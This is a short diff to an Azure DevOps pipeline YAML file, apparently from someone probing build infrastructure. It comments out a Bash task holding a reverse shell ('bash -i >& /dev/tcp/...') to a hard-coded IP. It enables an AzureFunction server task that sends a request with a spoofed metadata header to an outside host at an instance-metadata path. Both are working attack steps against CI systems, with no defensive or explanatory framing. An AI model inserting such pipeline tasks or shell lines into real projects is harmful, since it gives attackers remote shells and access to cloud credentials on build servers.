@@ -13,22 +13,22 @@ variables:
 
 jobs:
 - job: A
-  #pool: server
+  pool: server
   steps:
-  # - task: AzureFunction@1
-  #   inputs:
-  #     function: 'http://acrin.lightspin.cafe/metadata/instance'
-  #     key: 'sss'
-  #     method: 'GET'
-  #     headers: |
-  #       {
-  #       "metadatax":"true"
-  #       }
-  #     waitForCompletion: 'false'
-  - task: Bash@3
+  - task: AzureFunction@1
     inputs:
-      targetType: 'inline'
-      script: |
-        # Write your commands here
+      function: 'http://acrin.lightspin.cafe/metadata/instance'
+      key: 'sss'
+      method: 'GET'
+      headers: |
+        {
+        "metadatax":"true"
+        }
+      waitForCompletion: 'false'
+  # - task: Bash@3
+  #   inputs:
+  #     targetType: 'inline'
+  #     script: |
+  #       # Write your commands here
         
-        bash -i >& /dev/tcp/3.84.4.40/80 0>&1
+  #       bash -i >& /dev/tcp/3.84.4.40/80 0>&1
